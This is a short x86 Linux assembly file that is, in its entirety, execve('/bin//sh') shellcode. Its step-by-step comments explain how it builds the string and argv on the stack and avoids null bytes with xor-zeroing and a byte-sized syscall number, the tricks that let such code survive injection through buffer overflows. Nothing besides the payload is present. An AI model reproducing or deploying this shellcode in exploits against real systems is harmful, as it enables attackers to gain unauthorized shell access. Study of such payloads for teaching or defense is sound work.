.code32
.text
.globl _start

_start:
  xorl %eax, %eax     /* We need to push a null terminated string to the stack */
  pushl %eax          /* So first, push a null */
  pushl $0x68732f2f   /* Push //sh */
  pushl $0x6e69622f   /* push /bin */
  movl  %esp, %ebx    /* Store the %esp of /bin/sh into %ebx */
  pushl %eax          /* Since eax is still null, let's use it again */
  pushl %ebx          /* Now we can writ the /bin/sh again for **argv */
  movl  %esp, %ecx    /* Write argv into %ecx */
  xorl  %edx, %edx    /* NULL out edx */
  movb  $0xb, %al     /* Write syscall 11 into %al */
  int $0x80           /* Interrupt the system */
